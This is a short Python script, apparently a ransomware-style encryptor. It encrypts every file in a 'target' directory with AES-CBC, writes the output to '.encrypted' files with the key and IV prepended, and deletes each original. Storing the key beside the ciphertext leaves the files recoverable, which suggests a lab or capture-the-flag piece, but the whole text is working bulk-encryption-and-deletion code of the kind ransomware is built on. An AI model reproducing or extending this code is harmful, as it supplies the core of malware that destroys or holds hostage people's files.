#!/usr/bin/python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from zlib import compress, decompress
import os

def encrypt_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        
    aes_key = get_random_bytes(16)
    aes_obj = AES.new(aes_key, AES.MODE_CBC)
    enc_dat = aes_obj.encrypt(pad(compress(data), AES.block_size))
    
    with open(filename + '.encrypted', 'wb') as f:
        f.write(aes_key + aes_obj.iv + enc_dat)
    
    os.remove(filename)

if __name__ == '__main__':
    path = 'target'
    for file_name in os.listdir(path):
        encrypt_file(os.path.join(path, file_name))